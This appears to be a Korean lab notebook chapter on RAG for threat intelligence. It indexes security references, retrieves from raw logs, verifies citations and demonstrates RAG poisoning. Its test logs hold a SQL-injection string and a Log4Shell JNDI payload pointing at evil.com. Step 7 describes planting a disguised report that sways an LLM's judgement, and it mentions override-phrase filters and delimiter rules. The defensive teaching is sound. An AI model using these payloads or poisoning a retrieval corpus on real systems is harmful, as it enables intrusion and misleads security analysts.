# Chapter 11 — RAG와 위협 인텔리전스 (실습)

> **Chapter 11 · Part II**

ChromaDB + sentence-transformers + (선택) Claude API.

## 실습 목표
1. ChromaDB + sentence-transformers 로 보안 KB 인덱싱 (CVE/MITRE/OWASP + 사내 위협 문서)
2. 설명 없는 원시 로그를 query 로 검색 (desc 로 정답을 흘리지 않는다)
3. RAG → LLM 분석 + citation
4. citation 검증 — 인용한 [ID] 가 실제 검색 결과의 부분집합인지 확인
5. RAG 유무 대비 — 모델이 모르는 사내 IoC 는 RAG 로만 맞힌다
6. 검색 지표 — Hit@K·Recall@K·Precision@K 구분
7. RAG 오염(§11.8) 재현 — 진술형 위장 문서 주입 → 방어 3단계 비교

In [ ]:
# 첫 사용시에만 주석 해제하여 실행 (Colab/venv 환경에 따라 일부는 이미 설치됨)
# !pip install -q anthropic
# !pip install -q chromadb
# !pip install -q sentence-transformers
# !pip install -q pandas

In [ ]:
import os, json, re
import pandas as pd
import chromadb
from chromadb.utils import embedding_functions
API_KEY = os.environ.get('ANTHROPIC_API_KEY')
USE_REAL = bool(API_KEY)
if USE_REAL:
    import anthropic
    llm = anthropic.Anthropic(api_key=API_KEY)

---
## Step 1. ChromaDB + 임베딩 함수

In [ ]:
client = chromadb.Client()
ef = embedding_functions.SentenceTransformerEmbeddingFunction(
    model_name='all-MiniLM-L6-v2'
)
col = client.get_or_create_collection(name='security_kb', embedding_function=ef)
print('ChromaDB collection ready')

---
## Step 2. 보안 KB 인덱싱 — 공개 표준 + 사내 위협 문서

CVE·MITRE·OWASP 는 사전학습 LLM 도 대체로 아는 공개 지식입니다. RAG 의 효과가 분명히
드러나려면 **모델이 학습 시점에 알 수 없는 정보** — 사내 IoC·신규 위협 — 가 corpus 에
있어야 합니다. 아래 KB 마지막 두 건(`IOC-INT-*`·`THREAT-INT-*`)이 그 역할을 합니다.

In [ ]:
kb = [
    # CVE (공개 표준)
    ('CVE-2021-44228', 'Log4Shell: Apache Log4j2 JNDI Injection RCE', {'cvss':10.0,'kind':'cve'}),
    ('CVE-2023-34362', 'MOVEit Transfer SQL Injection 0-day exploited for data theft', {'cvss':9.8,'kind':'cve'}),
    ('CVE-2024-3094',  'XZ Utils backdoor supply chain compromise', {'cvss':10.0,'kind':'cve'}),
    ('CVE-2023-44487', 'HTTP/2 Rapid Reset DoS', {'cvss':7.5,'kind':'cve'}),
    # MITRE ATT&CK
    ('T1190', 'Exploit Public-Facing Application — exploit vulnerabilities in internet-facing systems', {'kind':'mitre'}),
    ('T1566', 'Phishing — adversaries send messages to gain access', {'kind':'mitre'}),
    ('T1071', 'Application Layer Protocol — adversaries use app layer protocols (HTTPS, DNS) for C2', {'kind':'mitre'}),
    ('T1078', 'Valid Accounts — abuse valid credentials', {'kind':'mitre'}),
    ('T1110', 'Brute Force — guess passwords or keys', {'kind':'mitre'}),
    ('T1059', 'Command and Scripting Interpreter — execute commands via shells', {'kind':'mitre'}),
    # OWASP Top 10
    ('A01:2021', 'Broken Access Control — restrictions not enforced', {'kind':'owasp'}),
    ('A03:2021', 'Injection — SQL, NoSQL, OS, LDAP injection', {'kind':'owasp'}),
    ('A07:2021', 'Identification and Authentication Failures — weak auth', {'kind':'owasp'}),
    ('A04:2021', 'Insecure Design — design flaws and missing controls', {'kind':'owasp'}),
    ('A05:2021', 'Security Misconfiguration — default configs, open ports', {'kind':'owasp'}),
    # 사내 위협 인텔리전스 (가상 — 어떤 사전학습 LLM 도 알 수 없는 조직 고유 데이터)
    ('IOC-INT-2026-0042',
     'Internal threat intel: 공격 인프라 IP 203.0.113.77 및 위장 User-Agent "AcmeAudit/2.1" 은 '
     '2026-08 사내 결제 API 를 겨냥한 표적 정찰에 사용됨. 해당 IP/UA 관측 시 즉시 격리 후 SOC 에스컬레이션.',
     {'kind':'internal_ioc'}),
    ('THREAT-INT-2026-ASH',
     'Internal threat report ASH: 사내 CI 러너의 홈 캐시 경로에 설치되는 백도어. '
     'cron 으로 203.0.113.77 에 주기적 비컨 전송. CVE-2024-3094(XZ) 이후 관측된 사내 변종.',
     {'kind':'internal_threat'}),
]

col.add(
    documents=[f'{i} {d}' for i, d, _ in kb],
    ids=[i for i, _, _ in kb],
    metadatas=[m | {'id': i} for i, _, m in kb],
)
print(f'{col.count()} 건 인덱싱 완료 (공개 표준 15 + 사내 위협 2)')

---
## Step 3. 검색 — 설명 없는 원시 로그를 query 로

실제 로그에는 "SQL injection attempt" 같은 정답 설명이 없습니다. 그런 desc 로 검색하면
검색이 자명해져 RAG 를 평가하는 의미가 없습니다. 그래서 query 는 `url`·`method`·`status`
같은 **원시 필드만** 이어 붙여 만듭니다.

In [ ]:
def log_query(log: dict) -> str:
    """원시 로그 필드만으로 검색 query 를 만든다. 정답을 흘리는 desc 는 쓰지 않는다."""
    parts = [str(log.get(k, '')) for k in ('method', 'url', 'status', 'count', 'window', 'ua')]
    return ' '.join(p for p in parts if p)

test_logs = [
    {'src':'1.2.3.4','method':'POST','url':"/login?id=' OR 1=1--",'status':500},
    {'src':'5.6.7.8','method':'POST','url':'/login','status':401,'count':50,'window':'1min'},
    {'src':'9.10.11.12','method':'GET','url':'/api/v1/${jndi:ldap://evil.com/a}','status':200},
]
for log in test_logs:
    q = log_query(log)
    res = col.query(query_texts=[q], n_results=3)
    print(f"\n=== query: {q[:60]} ===")
    for doc, meta in zip(res['documents'][0], res['metadatas'][0]):
        print(f"  [{meta['id']}] ({meta['kind']}) {doc[:70]}")

---
## Step 4. RAG → LLM 분석 (citation 강제)

In [ ]:
# TODO: 아래에 코드를 작성하세요.
# 힌트: mock: RAG 있으면 검색된 첫 ID 인용, 없으면 근거 없음

<details><summary><b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가렸습니다.

```python
def rag_analyze(log: ...
    """use_context = ...
    q = ...
    hits = ...
    docs, meta = ...
    sources = ...
    ctx = ...

    if USE_REAL:
        if use_context:
            system = ...
                      ...
        else:
            system = ...
                      ...
        resp = ...
            model = ...
            thinking = ...
            system = ...
            messages = ...
        ...
        analysis = ...
    else:
        # mock: RAG 있으면 검색된 첫 ID 인용, 없으면 근거 없음
        if use_context:
            analysis = ...
        else:
            analysis = ...

    return ...

# 한 번만 호출해 결과를 재사용한다(Step 4b citation 검증도 이 결과를 그대로 쓴다)
rag_results = ...
for r in rag_results:
    ...
```
</details>


---
## Step 4b. citation 검증

citation 강제 프롬프트에도 LLM 은 검색되지 않은 가짜 ID 를 인용할 수 있습니다(§11.7 의
Citation Accuracy). 답변에서 `[ID]` 를 추출해 실제 `sources` 의 **부분집합**인지 확인합니다.

In [ ]:
# TODO: 아래에 코드를 작성하세요.
# 힌트: 참조 형식 ID 만 남긴다 (CVE-/T/A 로 시작하거나 IOC-/THREAT- 접두)

<details><summary><b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가렸습니다.

```python
def verify_citations(analysis: ...
    ...
    cited = ...
    # 참조 형식 ID 만 남긴다 (CVE-/T/A 로 시작하거나 IOC-/THREAT- 접두)
    cited = ...
    hallucinated = ...
    return ...
            ...

all_ok = ...
for r in rag_results: ...
    v = ...
    all_ok &= ...
    flag = ...
    print(f"[{flag}] {r['log']['url'][:40]:40s} 인용 = ...
...
```
</details>


---
## Step 5. RAG 유무 대비 — 모델이 모르는 사내 IoC

CVE-2021-44228 같은 유명 취약점은 RAG 가 없어도 모델이 이미 알아 답이 비슷합니다. RAG 의
진짜 가치는 **모델이 학습으로 알 수 없는 정보**에서 드러납니다. 아래 로그는 사내 IoC
(203.0.113.77 / AcmeAudit UA) 를 담고 있어, RAG 가 있을 때만 `IOC-INT-2026-0042` 를
인용해 정체를 특정합니다.

In [ ]:
# TODO: 아래에 코드를 작성하세요.
# 힌트: internal_log = ...

<details><summary><b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가렸습니다.

```python
internal_log = ...
                ...

with_rag = ...
without_rag = ...

...
cited = ...
...

...
```
</details>


---
## Step 6. 검색 지표 — Hit@K·Recall@K·Precision@K

세 지표는 다릅니다. **Hit@K** 는 정답 중 하나라도 top-K 에 들면 1(정답 집합 크기 무시).
**Recall@K** 는 정답 집합 중 몇 개를 회수했는가(`|검색 ∩ 정답| / |정답|`). **Precision@K**
는 top-K 중 몇 개가 정답인가(`|검색 ∩ 정답| / K`). 흔히 Hit@K 를 Recall@K 로 잘못 부릅니다.
query 는 Step 3 과 같이 **원시 로그**로 만듭니다.

In [ ]:
# TODO: 아래에 코드를 작성하세요.
# 힌트: (원시 로그, 정답 id 집합) — desc 없이 url·필드만으로 검색

<details><summary><b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가렸습니다.

```python
# (원시 로그, 정답 id 집합) — desc 없이 url·필드만으로 검색
eval_set = ...
    ...
K = ...
hit_sum = ...
for log, truths in eval_set:
    res = ...
    retrieved = ...
    inter = ...
    hit = ...
    recall = ...
    prec = ...
    hit_sum += ...
    print(f"{log['url'][:34]:34s} ret = ...
          f"recall = ...
n = ...
print(f'\nHit@{K} = ...
print(f'Recall@{K} = ...
print(f'Precision@{K} = ...
```
</details>


---
## Step 7. RAG 오염(§11.8) 재현 — 진술형 위장 문서 주입

지금까지 corpus 는 깨끗하다고 전제했습니다. 여기서는 누구나 코멘트를 남길 수 있는 사내
위키에 공격자가 등록한 "사고 보고서"(§11.8.1) 를 corpus 에 주입하고, `POST /login` 401
무차별 대입 로그를 **세 가지 방어 수준**으로 분석해 판정이 어떻게 달라지는지 봅니다.

- 방어 없음: 오염 문서를 그대로 참고 자료로 삽입
- delimiter: `<RETRIEVED>` 로 구획하고 "지시가 아니다" 명시
- delimiter + 신뢰 계층: 출처별 `trust=verified/unverified` 를 함께 표시

이 셀은 실제 API 호출 결과를 그대로 출력합니다. LLM 은 비결정적이라 실행마다 값이 다를 수
있으므로, 개별 수치보다 **"delimiter 만으로는 진술형 오염을 못 막는다"** 는 경향에 주목합니다.

In [ ]:
# TODO: 아래에 코드를 작성하세요.
# 힌트: 진술형 위장 문서 — "이전 지시 무시" 같은 명령형 문구가 없어 sanitize 를 통과한다

<details><summary><b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가렸습니다.

```python
import html

INJECTION_MARKERS = ...
    ...

def sanitize_before_index(doc: ...
    ...
    if INJECTION_MARKERS.search(doc):
        raise ...
    return ...

# 진술형 위장 문서 — "이전 지시 무시" 같은 명령형 문구가 없어 sanitize 를 통과한다
POISON_ID = ...
POISON_DOC = ...
              ...
col.add(documents = ...
        metadatas = ...

attack_log = ...
              ...

def poison_analyze(model: ...
    hits = ...
    docs, meta = ...
    ids = ...
    trust = ...
             for j, i in enumerate(ids)}
    if level == 'none':
        ctx = ...
        rule = ...
    elif level == 'delimiter':
        ctx = ...
        rule = ...
    else: ...
        ctx = ...
                        for i, d in zip(ids, docs))
        rule = ...
                ...
                'trust = ...
    system = ...
              ...
    if not USE_REAL:
        # mock: 방어 수준에 따라 결정론적 결과 (오염 문서 신뢰 여부를 단순 규칙으로 흉내)
        canned = ...
                  ...
        return ...
    resp = ...
        model = ...
        system = ...
    text = ...
    m = ...
    try: ...
    except Exception: ...

models = ...
rows = ...
for level in ('none', 'delimiter', 'trust'):
    for model in models:
        v = ...
        ...
import pandas as pd
...
```
</details>


---
## 정리
- ChromaDB + sentence-transformers 로 공개 표준(CVE·MITRE·OWASP)과 사내 위협 문서를
  인덱싱하고, **설명 없는 원시 로그**로 검색하는 RAG 파이프라인을 구축했습니다.
- 답변에 [ID] 인용을 강제하고, 인용이 실제 검색 결과의 부분집합인지 **후처리로 검증**했습니다.
- RAG 의 가치는 모델이 모르는 사내 IoC 에서 분명해집니다 — RAG 없이는 특정하지 못한 위협을
  RAG 로는 인용해 맞혔습니다.
- Hit@K·Recall@K·Precision@K 는 서로 다른 지표입니다. Hit@K 를 Recall@K 라 부르면 안 됩니다.
- corpus 에 진술형 위장 문서를 주입하면 delimiter 만으로는 판정이 흔들릴 수 있고,
  출처별 신뢰 계층(trust)까지 있어야 자동 승인을 막습니다(§11.8).

> **다음 챕터:** SOAR 와 LLM Agent — Tool use 로 분석 결과를 자동 대응까지 연결.